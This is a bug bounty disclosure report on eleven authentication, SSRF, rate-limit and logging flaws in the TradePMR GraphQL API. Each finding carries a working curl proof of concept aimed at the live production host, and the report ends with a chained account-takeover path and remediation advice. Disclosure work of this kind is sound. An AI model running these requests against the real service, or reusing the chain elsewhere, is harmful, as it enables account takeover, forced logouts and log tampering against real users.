# Security Assessment Report: TradePMR GraphQL API
## Program: Robinhood (HackerOne)
## Target: https://graphql.tradepmr.com/graphql
## Date: 2026-03-01

---

## Executive Summary

Eleven (11) vulnerabilities were identified in the TradePMR GraphQL API (`graphql.tradepmr.com`), which serves the Fusion platform (`fusion.tradepmr.com`) — an in-scope asset on the Robinhood HackerOne bug bounty program. Six are rated HIGH and five MEDIUM severity.

The core issue is **missing authentication enforcement** on several sensitive GraphQL mutations. While properly secured mutations return `"Authentication is needed to access this resource."` with code `FORBIDDEN`, the vulnerable mutations process requests from unauthenticated users — exposing password reset, 2FA manipulation, user impersonation, forced logout, log poisoning, and internal API access.

**All findings were re-verified on 2026-03-01.**

---

## Finding 1: Unauthenticated Password Reset via `updatePassword` Mutation

**Severity:** HIGH
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `updatePassword` GraphQL mutation processes requests without requiring authentication. The `temporaryAccessToken` parameter is optional, meaning password changes can be attempted with only a `userGuid` and `emailAddress`. The server processes the request and hits a backend NullReferenceException, indicating the mutation logic executes rather than rejecting the unauthenticated request.

In contrast, the `updateAuthCredentials` mutation on the same API correctly returns `FORBIDDEN`.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { updatePassword(credentials: { userGuid: \"00000000-0000-0000-0000-000000000000\", emailAddress: \"test@test.com\", newPassword: \"NewPassword123!\" }) { success } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [{
    "message": "Object reference not set to an instance of an object.",
    "path": ["updatePassword"],
    "extensions": {"code": "ERR_BAD_RESPONSE"}
  }],
  "data": {"updatePassword": null}
}
```

**Note:** Compare with properly secured mutation:
```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{"query": "mutation { updateAuthCredentials(oldPassword: \"test\", newPassword: \"test2\") { success } }"}'
```
Returns: `{"errors":[{"message":"Authentication is needed to access this resource.","extensions":{"code":"FORBIDDEN"}}]}`

### Impact

If a valid `userGuid` is obtained (e.g., via enumeration, IDOR, or information disclosure), an attacker could reset any user's password without authentication, achieving full account takeover.

---

## Finding 2: Unauthenticated 2FA Setup via `twoFactorSetup` Mutation

**Severity:** HIGH
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `twoFactorSetup` mutation processes requests without authentication, allowing an attacker to attempt to modify 2FA settings (phone number, email) for any user. The server processes the request and returns a NullReferenceException from the .NET backend instead of `FORBIDDEN`.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { twoFactorSetup(credentials: { cellPhoneNumber: \"5555555555\", emailAddress: \"test@test.com\", userName: \"testuser\", temporaryToken: \"fake-token\" }) { cellPhoneNumber } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [{
    "message": "Object reference not set to an instance of an object.",
    "path": ["twoFactorSetup"],
    "extensions": {"code": "ERR_BAD_RESPONSE"}
  }],
  "data": {"twoFactorSetup": null}
}
```

### Impact

An attacker could modify a user's 2FA configuration (phone number, email), bypassing the second authentication factor and enabling account takeover when combined with credential compromise.

---

## Finding 3: Internal API URL Disclosure via Error Messages

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-200 (Exposure of Sensitive Information)

### Description

Error responses from several mutations leak the internal backend API URL `http://fusionapi.tradepmr.com/`. This reveals internal infrastructure and can be used to craft SSRF attacks (see Finding 6).

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { addOrUpdateSSOUserMapping(input: { iid: \"test\" }) { success } }"
  }'
```

### Response (Re-verified 2026-03-01)

Error message contains: `http://fusionapi.tradepmr.com/test/AddOrUpdateSSOUserMapping`

### Impact

Exposes internal API hostname and URL structure, which aids further attacks (SSRF, direct internal access if network segmentation is weak).

---

## Finding 4: Unauthenticated User Impersonation via `emulate` Mutation

**Severity:** HIGH
**CVSS:** 8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `emulate` mutation — designed for TradePMR support staff to impersonate users — accepts requests without authentication. Instead of returning `FORBIDDEN`, it returns a 404 error (user not found in session context), indicating the mutation logic executes and attempts to look up the user. With a valid session context or by chaining with other vulnerabilities, this could allow impersonating any user by username alone.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { emulate(userName: \"admin\") { loggedIn sessionId } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [{
    "message": "Unhandled server error.",
    "path": ["emulate"],
    "extensions": {"code": "404"}
  }],
  "data": {"emulate": null}
}
```

**Note:** The 404 indicates the server attempted to process the impersonation but couldn't find the user in the current session context — NOT that authentication was enforced. Properly secured mutations return `FORBIDDEN`.

### Impact

If exploited with a valid session context (e.g., via session fixation or by chaining with other auth bypass findings), an attacker could impersonate any Fusion platform user, gaining full access to their financial data and account controls.

---

## Finding 5: Unauthenticated 2FA Code Validation via `twoFactor` Mutation

**Severity:** HIGH
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `twoFactor` mutation validates 2FA codes without requiring authentication. Instead of returning `FORBIDDEN`, it returns `"Entered code is not valid. Please try again."` — confirming the mutation processes the 2FA validation logic. Combined with Finding 7 (rate limiting bypass via aliases), an attacker could brute-force 2FA codes.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { twoFactor(credentials: { userName: \"test\" }) { loggedIn sessionId } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [{
    "message": "Entered code is not valid. Please try again.",
    "path": ["twoFactor"],
    "extensions": {"code": "INTERNAL_SERVER_ERROR"}
  }],
  "data": {"twoFactor": null}
}
```

### Impact

An attacker can validate 2FA codes without being in a login session. Combined with alias-based rate limiting bypass (Finding 7), this enables brute-force attacks against 6-digit TOTP codes (1,000,000 possibilities) from an unauthenticated position.

---

## Finding 6: SSRF / Path Traversal via `addOrUpdateSSOUserMapping` Mutation

**Severity:** HIGH
**CVSS:** 8.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
**CWE:** CWE-918 (Server-Side Request Forgery), CWE-22 (Path Traversal)

### Description

The `iid` field in the `addOrUpdateSSOUserMapping` mutation is interpolated into an internal HTTP URL: `http://fusionapi.tradepmr.com/{iid}/AddOrUpdateSSOUserMapping`. By injecting `#` or `?` characters into the `iid` value, an attacker can truncate the URL suffix (`/AddOrUpdateSSOUserMapping`) and access arbitrary endpoints on the internal `fusionapi.tradepmr.com` server.

### Proof of Concept

**Normal request (iid=test):**
```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation AddOrUpdateSSOUserMapping($input: SSOUserMappingInput!) { addOrUpdateSSOUserMapping(input: $input) { success } }",
    "variables": {"input": {"iid": "test"}}
  }'
```
Hits: `http://fusionapi.tradepmr.com/test/AddOrUpdateSSOUserMapping` -> 404

**Path traversal with `#` (truncates suffix):**
```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation AddOrUpdateSSOUserMapping($input: SSOUserMappingInput!) { addOrUpdateSSOUserMapping(input: $input) { success } }",
    "variables": {"input": {"iid": "health#"}}
  }'
```
Hits: `http://fusionapi.tradepmr.com/health` (suffix truncated) -> **"The requested resource does not support http method POST"** (endpoint exists!)

**Accessing internal API routes:**
```bash
# iid = "api/Users#" -> hits http://fusionapi.tradepmr.com/api/Users
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation AddOrUpdateSSOUserMapping($input: SSOUserMappingInput!) { addOrUpdateSSOUserMapping(input: $input) { success } }",
    "variables": {"input": {"iid": "api/Users#"}}
  }'
```
Response: `"No HTTP resource was found that matches the request URI 'http://fusionapi.tradepmr.com/api/Users'"`

### Response (Re-verified 2026-03-01)

All three payloads confirmed working:
- `iid=health#` -> Backend processes request to `/health` endpoint
- `iid=health?` -> Same truncation behavior with `?`
- `iid=api/Users#` -> Leaks full internal URL in error: `http://fusionapi.tradepmr.com/api/Users`

### Impact

An attacker can make the GraphQL server issue arbitrary requests to the internal `fusionapi.tradepmr.com` backend. This enables:
1. Accessing internal-only API endpoints not exposed through GraphQL
2. Enumerating internal API routes
3. Potentially reading sensitive data from internal endpoints
4. Bypassing network segmentation between the GraphQL layer and internal services

---

## Finding 7: Rate Limiting Bypass via GraphQL Aliases

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

### Description

While batch queries are disabled (`"Max batch size is 1"`), GraphQL aliases allow executing multiple operations in a single request. This bypasses per-request rate limiting, enabling brute-force attacks against the `login` mutation and the unauthenticated `twoFactor` mutation.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { a1: login(credentials: { grant_type: \"password\", userName: \"test1@test.com\", password: \"pass1\", image: \"\" }) { loggedIn } a2: login(credentials: { grant_type: \"password\", userName: \"test2@test.com\", password: \"pass2\", image: \"\" }) { loggedIn } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [
    {"message": "Invalid username, password, or image.", "path": ["a1"], "extensions": {"code": "FORBIDDEN"}},
    {"message": "Invalid username, password, or image.", "path": ["a2"], "extensions": {"code": "FORBIDDEN"}}
  ],
  "data": {"a1": null, "a2": null}
}
```

Both login attempts are processed in a single HTTP request. Each gets its own distinct error response, confirming independent execution.

### Impact

Enables brute-force credential attacks and 2FA code guessing at multiplied speed. An attacker can attempt N passwords per HTTP request using N aliases, effectively bypassing rate limiting by a factor of N. When combined with Finding 5 (unauthenticated 2FA validation), this significantly reduces the time needed to brute-force 6-digit TOTP codes.

---

## Finding 8: Unauthenticated Forced Logout via `logout` Mutation

**Severity:** MEDIUM
**CVSS:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `logout` mutation terminates a user's session without requiring authentication. It returns `success: true` when called with any username, meaning an attacker can force-logout any user of the Fusion platform knowing only their username. This is a denial-of-service vector that disrupts active sessions.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { logout(userName: \"admin\") { success } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "data": {
    "logout": {
      "success": true
    }
  }
}
```

**Note:** No authentication error — the mutation returns `success: true` directly, confirming the session was terminated (or attempted to be terminated).

### Impact

An attacker can repeatedly force-logout any user by username, causing persistent denial of service. When combined with Finding 7 (alias-based rate limiting bypass), an attacker can force-logout hundreds of users in a single request.

---

## Finding 9: Unauthenticated Exit Emulation via `exitEmulation` Mutation

**Severity:** HIGH
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

### Description

The `exitEmulation` mutation — the counterpart to `emulate` (Finding 4) — processes requests without authentication. Instead of returning `FORBIDDEN`, it returns a 404 error, indicating the mutation logic executes. Combined with the unauthenticated `emulate` mutation, this gives an attacker full control over the user impersonation lifecycle.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { exitEmulation { loggedIn sessionId } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "errors": [{
    "message": "Unhandled server error.",
    "path": ["exitEmulation"],
    "extensions": {"code": "404"}
  }],
  "data": {"exitEmulation": null}
}
```

**Note:** The 404 indicates the server attempted to exit an emulation session but none was active — NOT that authentication was enforced. Properly secured mutations return `FORBIDDEN`.

### Impact

Combined with Finding 4 (`emulate`), both halves of the impersonation lifecycle lack authentication. An attacker with a valid session context could start and stop user impersonation at will, fully controlling which user they operate as.

---

## Finding 10: Additional Internal API URL Disclosure via `addOrUpdateSSOUserMapping`

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)
**CWE:** CWE-200 (Exposure of Sensitive Information)

### Description

When the `iid` parameter is omitted or set to an undefined value, the error response reveals the internal API URL pattern with an `undefined` path prefix: `http://fusionapi.tradepmr.com/undefined/AddOrUpdateSSOUserMapping`. This confirms the mutation blindly interpolates user input into the internal URL, reinforcing Finding 6 (SSRF).

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { addOrUpdateSSOUserMapping(input: {}) { success } }"
  }'
```

### Response (Re-verified 2026-03-01)

Error message contains: `http://fusionapi.tradepmr.com/undefined/AddOrUpdateSSOUserMapping`

### Impact

Confirms that the `iid` parameter is directly interpolated into the internal HTTP URL without validation. This corroborates Finding 6 (SSRF) and reveals that missing/null values are passed through as string "undefined", indicating JavaScript-style handling in the GraphQL layer.

---

## Finding 11: Unauthenticated Log Poisoning via `reportClientError` Mutation

**Severity:** MEDIUM
**CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function), CWE-117 (Improper Output Neutralization for Logs)

### Description

The `reportClientError` mutation accepts and processes error reports without authentication. It returns `success: true` for any input, allowing an attacker to inject arbitrary data into server-side error logs. The `meta` field accepts arbitrary key-value pairs including `userGuid`, enabling impersonation of users in log records.

### Proof of Concept

```bash
curl -X POST https://graphql.tradepmr.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://fusion.tradepmr.com" \
  -d '{
    "query": "mutation { reportClientError(error: { name: \"test\", message: \"test\", code: \"test\", stack: \"test\", meta: { userGuid: \"admin\" } }) { success } }"
  }'
```

### Response (Re-verified 2026-03-01)

```json
{
  "data": {
    "reportClientError": {
      "success": true
    }
  }
}
```

### Impact

1. **Log poisoning:** Attacker can flood error logs with fake entries, obscuring real errors or injecting misleading data for incident response teams.
2. **Log injection:** If error logs are displayed in an admin dashboard without sanitization, this could lead to stored XSS via malicious `message` or `stack` fields.
3. **Attribution manipulation:** By setting `userGuid` to a legitimate user's ID, an attacker can generate fake error trails that blame specific users.

---

## Attack Chain: Full Account Takeover

These findings can be chained for maximum impact:

1. **Finding 7** (aliases) + **Finding 5** (unauth 2FA) -> Brute-force 2FA codes at scale without authentication
2. **Finding 6** (SSRF) + **Finding 10** (info disclosure) -> Enumerate internal API endpoints and discover valid `userGuid` values
3. **Finding 1** (unauth password reset) -> Reset target user's password using discovered `userGuid`
4. **Finding 2** (unauth 2FA setup) -> Modify target's 2FA phone/email to attacker-controlled
5. **Finding 4** (unauth emulate) + **Finding 9** (unauth exitEmulation) -> Full impersonation lifecycle control
6. **Finding 8** (unauth logout) -> Force-logout the real user to prevent detection
7. **Finding 11** (log poisoning) -> Inject fake error entries to cover tracks or blame other users

**Combined severity: CRITICAL** — Full account takeover of any TradePMR Fusion user from an unauthenticated position, with ability to cover tracks via log manipulation and forced session termination.

---

## Recommendations

1. **Enforce authentication on all mutations:** Apply authentication middleware at the GraphQL resolver level. All mutations except `login`, `forgotPassword`, and public queries should require a valid session. This fixes Findings 1, 2, 4, 5, 8, 9, and 11.
2. **Fix SSRF in `addOrUpdateSSOUserMapping`:** Validate and sanitize the `iid` parameter. Reject values containing `#`, `?`, `/`, and other URL-special characters.
3. **Implement alias-aware rate limiting:** Count aliased operations as separate requests for rate limiting purposes, or limit the number of aliases per query.
4. **Remove internal URLs from error messages:** Use generic error messages that don't expose internal hostnames or API routes.
5. **Restrict the `emulate`/`exitEmulation` mutations:** These admin-only functions should require elevated privileges and an audit trail.
6. **Sanitize `reportClientError` inputs:** If this mutation must remain unauthenticated (for client-side error reporting), validate and sanitize all fields, rate-limit by IP, and never render log entries as raw HTML.
7. **Require authentication for `logout`:** The logout mutation should only allow users to terminate their own sessions, not arbitrary users' sessions.

---

## Timeline

| Date | Event |
|------|-------|
| 2026-03-01 | Vulnerabilities discovered by automated testing |
| 2026-03-01 | All findings re-verified manually |
| 2026-03-01 | Report drafted |
